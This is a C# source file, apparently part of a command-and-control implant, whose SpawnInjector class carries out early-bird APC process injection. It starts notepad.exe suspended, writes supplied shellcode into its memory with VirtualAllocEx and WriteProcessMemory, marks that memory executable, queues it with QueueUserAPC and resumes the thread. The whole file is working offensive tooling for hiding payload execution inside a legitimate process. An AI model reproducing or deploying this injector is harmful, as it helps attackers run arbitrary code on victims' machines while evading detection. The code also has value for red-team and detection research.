using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public class SpawnInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            var threadAttributes = new Native.Kernel32.SECURITY_ATTRIBUTES();
            threadAttributes.nLength = Marshal.SizeOf(threadAttributes);

            var processAttributes = new Native.Kernel32.SECURITY_ATTRIBUTES();
            processAttributes.nLength = Marshal.SizeOf(processAttributes);

            var startInfo = new Native.Kernel32.STARTUPINFO();

            if (!Native.Kernel32.CreateProcess(@"C:\Windows\System32\notepad.exe", null,
                ref processAttributes, ref threadAttributes, false,
                Native.Kernel32.CreationFlags.CreateSuspended, IntPtr.Zero, @"C:\Windows\System32",
                ref startInfo, out var processInfo))
            {
                return false;
            }

            var baseAddress = Native.Kernel32.VirtualAllocEx(
              processInfo.hProcess,
              IntPtr.Zero,
              shellcode.Length,
              Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
              Native.Kernel32.MemoryProtection.ReadWrite);

            Native.Kernel32.WriteProcessMemory(
                processInfo.hProcess,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            Native.Kernel32.VirtualProtectEx(
                processInfo.hProcess,
                baseAddress,
                shellcode.Length,
                Native.Kernel32.MemoryProtection.ExecuteRead,
                out _);

            // Add shellcode object to APC (async procedure call) queue of a specific thread in a process with just spawned
            Native.Kernel32.QueueUserAPC(baseAddress, processInfo.hThread, 0);
            var result = Native.Kernel32.ResumeThread(processInfo.hThread);
            return result > 0;
        }
    }
}
